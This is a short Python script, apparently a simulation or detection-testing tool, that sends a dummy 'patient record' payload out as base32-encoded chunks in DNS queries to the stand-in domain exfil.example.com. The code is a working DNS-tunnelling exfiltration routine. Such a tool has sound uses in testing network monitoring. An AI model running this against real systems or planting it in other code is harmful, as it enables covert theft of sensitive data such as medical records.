#!/usr/bin/env python3
import socket
import base64
import time

DATA   = b"PATIENT_RECORD_DUMP_SIMULATED_PAYLOAD_" * 50
DOMAIN = "exfil.example.com"
CHUNK_SIZE = 30
DELAY = 0.1

def chunk_data(data, size):
    for i in range(0, len(data), size):
        yield data[i:i + size]

def run():
    print(f"Encoding and sending {len(DATA)} bytes as DNS queries...")
    for i, chunk in enumerate(chunk_data(DATA, CHUNK_SIZE)):
        encoded = base64.b32encode(chunk).decode().rstrip('=').lower()
        query   = f"{encoded}.{DOMAIN}"
        try:
            socket.gethostbyname(query)
        except socket.error:
            pass
        print(f"[{i}] {query[:60]}...")
        time.sleep(DELAY)
    print("Done.")

if __name__ == "__main__":
    run()
